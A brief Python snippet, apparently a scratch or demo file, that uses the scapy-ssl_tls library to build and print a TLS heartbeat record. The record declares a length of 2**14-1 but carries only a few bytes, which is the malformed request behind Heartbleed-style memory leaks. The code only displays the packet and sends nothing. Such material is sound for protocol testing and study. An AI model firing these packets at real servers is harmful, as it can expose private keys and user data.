"""
https://github.com/tintinweb/scapy-ssl_tls
"""

from scapy_ssl_tls.ssl_tls import TLS


from scapy import *

from scapy_ssl_tls.ssl_tls import TLS,SSL,TLSRecord,TLSHeartBeat

(TLSRecord(version="TLS_1_1")/TLSHeartBeat(length=2**14-1,data='bleed...')).show()